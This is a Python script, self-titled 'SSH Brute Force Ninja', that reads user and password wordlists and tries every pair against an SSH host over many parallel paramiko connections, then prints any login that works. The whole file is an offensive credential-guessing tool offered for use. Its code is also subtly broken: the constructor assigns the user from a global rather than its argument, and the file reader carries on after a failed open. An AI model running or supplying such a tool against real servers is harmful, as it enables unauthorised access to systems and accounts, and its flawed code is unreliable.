#!/usr/bin/env python
import sys, time
from threading import Thread

try:
    from paramiko import SSHClient
    from paramiko import AutoAddPolicy
except ImportError:
    print('''
    You need paramiko module.
    http://www.lag.net/paramiko/    
    Debian/Ubuntu: aptitude install python-paramiko\n''')
    sys.exit(1)


class BruteForce(Thread):
    def __init__(self, username, password, target, port, timeout):
        super(BruteForce, self).__init__()

        self.__port   = port
        self.target   = target
        self.password = password
        self.user     = user
        self.timeout  = timeout
        self.status   = 'unknown'

    def run(self):
        # Create SSH connection to target

        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        try:
            ssh.connect(self.target, port = self.__port, username = self.user, password = self.password, pkey=None, timeout = self.timeout, allow_agent=False, look_for_keys=False)
            self.status = 'ok'
            ssh.close()
        except Exception as e:
            self.status = 'error'
            pass


def makelist(file):
    # Make lists

    items = []

    try:
        fd = open(file, 'r')
    except IOError:
        print('unable to read file \'%s\'' % file)
        pass

    except Exception as e:
        print('unknown error')
        pass

    for line in fd.readlines():
        item = line.replace('\n', '').replace('\r', '')
        items.append(item)

    return items


if __name__ == '__main__':
    from optparse import OptionError
    from optparse import OptionParser    

    usage = '%s [-H target] [-p port] [-U userslist] [-P wordlist] [-T threads] [-w timeout] [-v]' % sys.argv[0]

    parser = OptionParser(usage=usage)

    parser.add_option('-H', dest='target', help='hostname/ip')
    parser.add_option('-p', type='int', dest='port', default=22, help='port (default:%default)')
    parser.add_option('-U', dest='userlist', help='userlist file')
    parser.add_option('-P', dest='passlist', help='passwordlist file')
    parser.add_option('-T', type='int', dest='threads', default=16, help='number of connections in parallel (%default threads)')
    parser.add_option('-w', type='int', dest='timeout', default=30, help='defines the max wait time in seconds for responses (%default secs)')
    parser.add_option('-v', '--verbose', action='store_true', dest='verbose', help='verbose')

    (options, args) = parser.parse_args()


    if not options.target or not options.userlist or not options.passlist:
        parser.print_help()
        sys.exit(1)

    target = options.target
    port = options.port
    users = options.userlist
    passwords = options.passlist
    threads = options.threads
    timeout = options.timeout
    
    results = []
    tcounter = 0

    userlist = makelist(users)
    passwordlist = makelist(passwords)

    print("[*] SSH Brute Force Ninja")
    print("[*] %s user(s) loaded." % str(len(userlist)))
    print("[*] %s password(s) loaded." % str(len(passwordlist)))
    print("[*] Brute Force started.")

    for user in userlist:
        for password in passwordlist:
            current = BruteForce(user, password, target, port, timeout)
            results.append(current)
            current.start()
            tcounter += 1
            if options.verbose:
                print("   [+] user: %s" % user + "  password: %s\n" % password, end=' ')
            if tcounter == threads:
                for result in results:
                    result.join()
                    if result.status == 'error':
                        pass
                    else:
                        print("\n[*] got it!")
                        print("[*] user: %s" % result.user)
                        print("[*] password: %s\n" % result.password)
                        sys.exit(0)
                tcounter = 0
    
    print("[*] Done.\n")
    sys.exit(0)

